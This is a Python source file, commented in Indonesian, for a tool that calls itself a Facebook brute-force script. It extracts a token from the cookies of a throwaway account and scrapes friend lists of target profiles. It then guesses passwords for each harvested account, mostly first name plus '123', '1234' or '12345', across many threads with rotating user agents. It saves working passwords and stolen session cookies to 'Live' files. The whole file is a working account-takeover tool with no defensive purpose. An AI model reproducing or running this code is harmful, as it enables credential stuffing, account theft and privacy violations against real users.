###-----[ IMPORT MODULE ]-----###
import requests,json,os,sys,random,datetime,time,re,uuid,subprocess,zlib,base64
from time import time as tod
from time import sleep
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as par
from urllib import request
from platform import platform
from urllib.error import URLError
ses = requests.Session()
###-----[ IMPORT RICH ]-----###
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich import print as prints
from rich.tree import Tree
from rich.console import Console
from rich.columns import Columns
wa = Console()
###-----[ APPEN AND MORE ]-----###
id,uid,uid2=[],[],[]
loop,ok,cp=0,0,0
akun,method=[],[]
uadia, uadarimu = [],[]
password_list,password_input= [],[]
pwpluss,pwnya=[],[]
ugen = []
rr = random.randint
rc = random.choice
###-----[ USERAGENT AND PROXY MENU ]-----###
try:
	url = ses.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open(".proxy.txt","w").write(url)
except:
	pass
def ugen():
	rr = random.randint
	rc = random.choice
	AA = f"Mozilla/5.0 (Linux; Android {str(rr(12,13))}; 2201117TY Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(98,151))}.0.6167.164 Mobile Safari/537.36"
	BB = f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G990B2) AppleWebKit/537.36 (KHTML, like Gecko; compatible; pageburst) SamsungBrowser/19.0 Chrome/{str(rr(85,130))}.0.{str(rr(2222,2999))}.{str(rr(100,150))} Mobile Safari/537.36"
	CC = f"Mozilla/5.0 (Linux; Android 12; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko; compatible; pageburst) Version/4.0 Chrome/{str(rr(115,149))}.0.{str(rr(2222,2999))}.{str(rr(100,150))} Mobile Safari/537.36 BingSapphire/21.0.390225302"
	DD = f"Mozilla/5.0 (Linux; Android 12; 22111317PI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(103,127))}.0.0.0 Mobile Safari/537.36"
#	AA = "Mozilla/5.0 (Linux; Android 12; 2201116PG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
#	BB = f"Mozilla/5.0 (Linux; Android {str(rr(7,9))}; SAMSUNG SM-G611FF Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/{str(rr(55,99))}.0.0.0 Mobile Safari/537.36"
#	CC = "Mozilla/5.0 (Linux; Android 13; 2312FPCA6G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.84 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/448.0.0.30.115;]"
#	DD = "Mozilla/5.0 (Linux; Android 12; 22111317PI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
#	EE = "Mozilla/5.0 (Linux; Android 13; 23076PC4BI Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/439.0.0.44.117;]"
#	BB = f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G990B2) AppleWebKit/537.36 (KHTML, like Gecko; compatible; pageburst) SamsungBrowser/19.0 Chrome/{str(rr(30,70))}.0.{str(rr(2222,2999))}.{str(rr(100,150))} Mobile Safari/537.36"
#	CC = f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; SAMSUNG SM-S916U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko; compatible; pageburst) Version/4.0 Chrome/{str(rr(30,70))}.0.{str(rr(2222,2999))}.{str(rr(100,150))} Mobile Safari/537.36"
#	DD = f"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-A720F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko; compatible; pageburst) SamsungBrowser/8.2 Chrome/{str(rr(30,70))}.0.{str(rr(2222,2999))}.{str(rr(100,150))} Mobile Safari/537.36"
#	EE = f"Mozilla/5.0 (Linux; Android 12; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko; compatible; pageburst) Version/4.0 Chrome/{str(rr(30,70))}.0.{str(rr(2222,2999))}.{str(rr(100,150))} Mobile Safari/537.36 BingSapphire/21.0.390225302"
	return rc([AA,BB,CC,DD])
prints(panel(f"[green]{ugen()}[/]",title=f"[[green]✓[/]]",style=f"bold white"));time.sleep(3)
###-----[ MENU WARNA PRINT BIASA ]-----###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
###-----[ MENU WARNA PRINT RICH ]-----###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
###-----[ TANGGAL BULAN TAHUN ]-----###
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'July','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'Live-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'Chek-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def waktu():
	now = datetime.datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi ðŸ‘‹"
	elif 12 <= hours < 15:timenow = "Selamat Siang ðŸ‘‹"
	elif 15 <= hours < 18:timenow = "Selamat Sore ðŸ‘‹"
	else:timenow = "Selamat Malam ðŸ‘‹"
	return timenow
###-----[ CLEAR DISPLAY ]-----###
def clear():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass
def back():
	menu()
###-----[ LOGO BANNER ]-----###
def banner():
	print(f"""{P}
  ________________________________________
 /   _____/\______   \______   \_   _____/
 \_____  \  |       _/|    |  _/|    __)  
 /        \ |    |   \|    |   \|     \   
/_______  / |____|_  /|______  /\___  /   
        \/         \/        \/     \/    
 [{B}Script For Brute Facebook{P}]\n [{M}Coded By Rendra Guna Binawan{P}]\n [{U}Est.2021{P}]{P}""")
###-----[ LOGIN COOKIES ]-----###
def login():
	print(f"\n{P}  - masukan cookie anda, disarankan menggunakan akun tumbal. {P}")
	print(f"  - notice: jika tetap invalid,gunakan akun tumbal dengan id 10008 kebawah.")
	print(f"  - notice: gunakan mode dekstop pada browser saat pengambilan cookies.")
	cok = input(f'  - cookies : {H}')
	open('.cok.txt', 'a').write(cok)
	try:
		ses.headers.update({'Accept-Language': 'id,en;q=0.9','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36','Referer': 'https://www.instagram.com/','Host': 'www.facebook.com','Sec-Fetch-Mode': 'cors','Accept': '*/*','Connection': 'keep-alive','Sec-Fetch-Site': 'cross-site','Sec-Fetch-Dest': 'empty','Origin': 'https://www.instagram.com','Accept-Encoding': 'gzip, deflate',})
		response = ses.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/dzikri3535/', cookies={'cookie':cok})
		if '"access_token":' in str(response.headers):
			token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
			open('.token.txt', 'a').write(token)
			exit(f"{P}  - token : {H}{token}{P} \n  - cookies aktif,jalankan ulang perintah nya dengan ketik python run.py");time.sleep(3)
		else:
			exit(f'{P}  - cookie kamu invalid silahkan menggunakan tumbal/cookies lain.')
	except Exception as e:exit(e)
###-----[ MENU SCRIPT ]-----###
def menu():
	clear();banner()
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'\n{P} [%] cookies kamu invalid.{P}')
		time.sleep(2);os.system('clear')
		login()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{P} [%] Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".token.txt")
		except:pass
		print(f"\n{P} [%] sepertinya akun tumbal mu terkena checkpoint...{P}");time.sleep(2)
		os.system('clear')
		login()
	prints(f"\n[bold white] [%] uid  facebook : {uidfb} \n [%] nama facebook : {nama} \n [%] metode login  : [bold green]validate facebook.com{P2}")
	print(f"\n{P} [1]. crack dari id publik. \n [2]. crack dari id publik {H}massal disarankan{P}. \n [3]. crack id dari file. \n [4]. dump id ke file. \n [5]. cek hasil crack \n [0]. keluar {M}hapus cookies{P}. {P}")
	menu = input(f'\n{P} [%] pilih 1/5 : ')
	if menu in ["01","1"]:
		try:
			token = open('.token.txt','r').read()
			cok = open('.cok.txt','r').read()
		except IOError:
			exit()
		print(f"\n{P} [%] pastikan id target tidak private/publik. {P}")
		user_dump = input(f' [%] input id target : ')
		uid.append(user_dump)
		for userr in uid:
			try:
				col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends.fields(id,name).limit(5000)&access_token={token}',cookies = {'cookies':cok}).json()
				for x in col['friends']['data']:
					try:
						sys.stdout.write(f"\r [%] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
						sys.stdout.flush()
						id.append(x['id']+'|'+x['name'])
					except:continue
			except (KeyError,IOError):
				pass
			except requests.exceptions.ConnectionError:
				print(f' [%] koneksi buruk, silahkan refresh jaringan anda. ')
				exit()
		try:
			setting()
		except requests.exceptions.ConnectionError:
			print(f'\n [%] koneksi buruk, silahkan refresh jaringan anda. ')
			exit()
	elif menu in ["02","2"]:
		Dump_Massal()
	elif menu in ["03","3"]:
		Crack_file()
	elif menu in ["04","4"]:
		Dump_id()
	elif menu in ["05","5"]:
		Result()
	elif menu in ['00','0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f' [%] Berhasil Keluar+Hapus Cookie ')
		exit()
	else:
		print(f" [%] input hanya dengan angka,jangan kosong.")
		time.sleep(3)
		back()
###-----[ MENU RESULT ]-----###
def Result():
	print(f"\n{P} [1]. cek hasil akun {H}Live{P}. \n [2]. cek hasil akun {K}Chek{P}. \n [3]. kembali.")
	lihat_result = input(f'\n [%] pilih 1/3 : ')
	if lihat_result in ['2']:
		try:vin = os.listdir('Chek')
		except FileNotFoundError:
			print(f' [%] file tidak ditemukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f' [%] anda tidak memiliki file {K}Check {P}')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('Chek/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{P} [%s]. %s ( {K}%s{P} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{P} [%s]. %s ( {K}%s{P} id )'%(cih,isi,len(hem)))
			geeh = input(f'\n [%] masukan nomer result yang ingin anda cek : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f' [%] pilih dengan benar ')
				back()
			try:lin = open('Chek/'+geh,'r').read().splitlines()
			except:
				print(f' [%] file tidak ditemukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				result_=lin[nocp].split('|')
				tree = Tree("")
				tree.add(f"{K2}{result_[0]}|{result_[1]}[white]")
				prints(tree)
				nocp +=1
			print('')
			input(f' [%] ketik enter jika ingin kembali ke menu')
			os.system("clear")
			time.sleep(3)
			back()
	elif lihat_result in ['1']:
		try:vin = os.listdir('Live')
		except FileNotFoundError:
			print(f' [%] file tidak ditemukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f' [%] anda tidak memiliki file {H}Live {P}')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('Live/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{P} [%s]. %s ( {H}%s{P} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{P} [%s]. %s ( {H}%s{P} id )'%(cih,isi,len(hem)))
			geeh = input(f'\n [%] masukan nomer result yang ingin anda cek : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f' [%] pilih dengan benar ')
				back()
			try:lin = open('Live/'+geh,'r').read().splitlines()
			except:
				print(f' [%] file tidak ditemukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				result_=lin[nocp].split('|')
				tree = Tree("")
				tree.add(f"{H2}{result_[0]}|{result_[1]}[white]").add(f"{H2}{result_[2]}[white]")
				prints(tree)
				nocp +=1
			print("")
			input(f' [%] ketik enter jika ingin kembali ke menu')
			os.system("clear")
			time.sleep(3)
			back()
	elif lihat_result in ['3']:
		back()
	else:
		print(f" [%] input hanya dengan angka,jangan kosong.")
		back()
###-----[ DUMP PUBLIK MASSAL ]-----###
def Dump_Massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print(f"\n{P} [%] pastikan id target tidak private/publik. {P}")
		jum = int(input(f' [%] input jumlah target ? : '))
	except ValueError:
		print(f' [%] input salah ')
		exit()
	if jum<1 or jum>100:
		print(f' [%] gagal dump id kemungkinan id bukan publik/private ')
		exit()
	ses=requests.Session()
	jumlah_input = 0
	for met in range(jum):
		jumlah_input+=1
		user_dump = input(f' [%] input id ke '+str(jumlah_input)+' : ')
		uid.append(user_dump)
	for userr in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends.fields(id,name,username,hometown)&access_token={token}',cookies = {'cookies':cok}).json()
			for x in col['friends']['data']:
				try:
					sys.stdout.write(f"\r [%] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
					sys.stdout.flush()
					id.append(x['id']+'|'+x['name'])
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f' [%] koneksi sinyal tidak stabil ')
			exit()
	try:
		setting()
	except requests.exceptions.ConnectionError:
		print('')
		print(f' [%] koneksi sinyal tidak stabil ')
		back()
###-----[ DUMP FILE ]-----###
def Dump_id():
	file = input(f"\n [%] masukan nama file dump anda : ")
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print(f"\n{P} [%] pastikan id target tidak private/publik. {P}")
		jum = int(input(f' [%] input jumlah target ? : '))
	except ValueError:
		print(f' [%] input salah ')
		exit()
	if jum<1 or jum>100:
		print(f' [%] gagal dump id kemungkinan id bukan publik/private ')
		exit()
	ses=requests.Session()
	jumlah_input = 0
	for met in range(jum):
		jumlah_input+=1
		user_dump = input(f' [%] input id ke '+str(jumlah_input)+' : ')
		uid.append(user_dump)
	for userr in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends.fields(id,name).limit(5000)&access_token={token}',cookies = {'cookies':cok}).json()
			for x in col['friends']['data']:
				try:
					sys.stdout.write(f"\r [%] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
					sys.stdout.flush()
					id.append(x['id']+'|'+x['name'])
					open(file,'a').write(x['id']+'|'+x['name']+'\n')
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f' [%] koneksi sinyal tidak stabil ')
			exit()
	try:
		exit(f"\n [%] sukses dump file tersimpan pada : {file}")
	except KeyError:
		print(f"\n [%] gagal dump, kemungkinan id tidak publik/cookies anda invalid")
	except requests.exceptions.ConnectionError:
		print('')
		print(f' [%] koneksi sinyal tidak stabil ')
		back()
###-----[ CRACK FILE ]-----###
def Crack_file():
	file = input(f"\n [%] masukan nama folder/file : ")
	try:
		uid = open(file,"r").read().splitlines()
		for data in uid:
			try:user,nama = data.split('|')
			except:continue
			sys.stdout.write(f"\r [%] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
			id.append(data)
	except FileNotFoundError:exit(f" [%] file tidak ada")
	setting()
###-----[ SETTING URUTAN & METODE ]-----###
def setting():
	print("")
	print(f"\n{P} [1]. urutan old ke new. \n [2]. urutan new ke old. \n [3]. urutan random. {P}")
	urutan_setting = input(f'\n [%] pilih 1/3 : ')
	if urutan_setting in ['1','01','old']:
		for tua in sorted(id):
			uid2.append(tua)
	elif urutan_setting in ['2','02','new']:
		muda=[]
		for new in sorted(id):
			muda.append(new)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			uid2.append(muda[bcmi])
			bcmi -=1
	elif urutan_setting in ['3','03','random']:
		for acak in id:
			xx = random.randint(0,len(uid2))
			uid2.insert(xx,acak)
	else:
		print(f" [%] input hanya dengan angka,jangan kosong.")
		exit()
	print(f"\n{P} [1]. password otomatis. \n [2]. password gabung. \n [3]. password manual. {P}")
	password_metode = input(f'\n [%] pilih 1/3 : ')
	if password_metode in ['1','01']:
		Otomatis()
	elif password_metode in ['2','02']:
		Gabung()
	elif password_metode in ['3','03']:
		Manual()
	else:
		print(f" [%] input hanya dengan angka,jangan kosong.")
		exit()
###-----[ SETTING PASSWORD OTOMATIS ]-----###
def Otomatis():
	ua = input(f' [%] ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f' [%] input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f"{P} [%] anda menggunakan user agent bawaan script. {P}")
	else:uadarimu.append('uasc')
	print(f"""
 [%] {P}hasil Live akan tersimpan di : {H}Live/{okc}{P}
 [%] {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P}
 [%] mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=28) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pasw = []
			if len(nama)<6:
				if len(depan)<3:pass
				else:
					#pasw.append(nama)
					pasw.append(depan+"123")
					pasw.append(depan+"1234")
					pasw.append(depan+"12345")
			else:
				if len(depan)<3:
					pasw.append(nama)
				else:
					#pasw.append(nama)
					pasw.append(depan+"123")
					pasw.append(depan+"1234")
					pasw.append(depan+"12345")
			MethodeCrack.submit(Validate,uid,pasw)
	print("\r")
	exit(f"{P} [%] sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ SETTING PASSWORD GABUNG ]-----###
def Gabung():
	pw_manual=input(f'\n [%] input password tambahan anda : ')
	password_manual=pw_manual.split(',')
	for xpw in password_manual:
		pwnya.append(xpw)
	ua = input(f' [%] ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f' [%] input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f"{P} [%] anda menggunakan user agent bawaan script. {P}")
	else:uadarimu.append('uasc')
	print(f"""
 [%] {P}hasil Live akan tersimpan di : {H}Live/{okc}{P}
 [%] {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P}
 [%] mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=25) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")
			pasw = []
			try:
				if len(nama) <=5:
					if len(depan) <=1 or len(depan) <=2:pass
					else:
						pasw.append(nama)
						#pasw.append(depan[0]+depan[1])
						#pasw.append(depan[0]+"321")
						#pasw.append(depan[0]+"1234")
				else:
					pasw.append(nama)
					#pasw.append(depan[0]+depan[1])
					#pasw.append(depan[0]+"321")
					#pasw.append(depan[0]+"1234")
				for xpwd in pwnya:
					pasw.append(xpwd)
				MethodeCrack.submit(Validate,uid,pasw)
			except:pass
	print("\r")
	print(f"{P} [%] sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ SETTING PASSWORD MANUAL ]-----###
def Manual():
	pw_manual=input(f'\n [%] input password manual anda : ')
	password_manual=pw_manual.split(',')
	for xpw in password_manual:
		pwnya.append(xpw)
	ua = input(f' [%] ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f' [%] input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f"{P} [%] anda menggunakan user agent bawaan script. {P}")
	else:uadarimu.append('uasc')
	print(f"""
 [%] {P}hasil Live akan tersimpan di : {H}Live/{okc}{P}
 [%] {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P}
 [%] mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=28) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")
			pasw = []
			for xpwd in pwnya:
				pasw.append(xpwd)
			MethodeCrack.submit(Validate,uid,pasw)
	print("\r")
	exit(f"{P} [%] sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ METODE VALIDATE ]-----###
def Validate(uid,pasw):
	global loop,ok,cp
	for i in list('\|-/'):
		sys.stdout.write(f"\r [{H}{i}{P}] {str(loop)}/{len(uid2)} Live:-{H}{ok}{P} Chek:-{K}{cp}{P}"),
		sys.stdout.flush()
	ses = requests.Session()
	rr = random.randint
	for pw in pasw:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = ugen()
			link = ses.get(f"https://mbasic.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&refsrc=deprecated&_rdr")
			data = {
			   "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
			   "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			   "uid": uid,
			   "next":"https://mbasic.facebook.com/",
			   "flow":"login_no_pin",
			   "pass": pw}
			headers_post = {
			   "Host": "mbasic.facebook.com",
			   "content-length": "143",
			   "cache-control": "max-age=0",
			   "upgrade-insecure-requests": "1",
			   "origin": "https://mbasic.facebook.com",
			   "content-type": "application/x-www-form-urlencoded",
			   "user-agent": ua,
			   "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			   "x-requested-with": "com.facebook.katana",
			   "sec-fetch-site": "same-origin",
			   "sec-fetch-mode": "navigate",
			   "sec-fetch-user": "?1",
			   "sec-fetch-dest": "document",
			   "referer": f"https://mbasic.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&refsrc=deprecated&_rdr",
			   "accept-encoding": "gzip, deflate",
			   "accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6"}
			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=headers_post,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{P} 😘 {H}{uid}|{pw}|{kuki}|{ua}{P}")
				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f"\r{P} 🫣 {K}{uid}|{pw}               {P}")
				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1

if __name__=='__main__':
	try:os.mkdir('Live')
	except:pass
	try:os.mkdir('Chek')
	except:pass
	menu()